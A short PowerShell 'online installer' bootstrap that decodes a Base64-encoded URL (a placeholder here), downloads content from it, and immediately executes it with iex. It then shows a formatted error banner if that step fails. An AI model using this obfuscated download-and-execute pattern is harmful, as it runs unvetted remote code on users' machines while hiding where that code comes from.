try 
{
    $key="BASE64_ENCODED_URL"
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    $l=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($key));iex (iwr $l -UseBasicParsing).Content
}
catch 
{
    clear-host
    write-host ""
    write-host "                                                                                           " -BackGroundColor Black
    write-host " ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR ERROR " -ForeGroundColor DarkRed -BackGroundColor Black
    write-host "                                                                                           " -BackGroundColor Black
    write-host "                  An error was detected while running the online installer                 " -ForeGroundColor Yellow -BackGroundColor Black
    write-host "                  The installer was not able to self-remediate the error                   " -ForeGroundColor Yellow -BackGroundColor Black
    write-host "                                                                                           " -BackGroundColor Black
    write-host "       You may need to use the offline installer if the target system is unsupported       " -ForeGroundColor Yellow -BackGroundColor Black
    write-host "                 Please forward the below error message to the developer                   " -ForeGroundColor Yellow -BackGroundColor Black
    write-host "                                                                                           " -BackGroundColor Black
    write-host ""
    write-host $_.Exception.Message -ForeGroundColor Red -BackGroundColor Black
    write-host ""
}
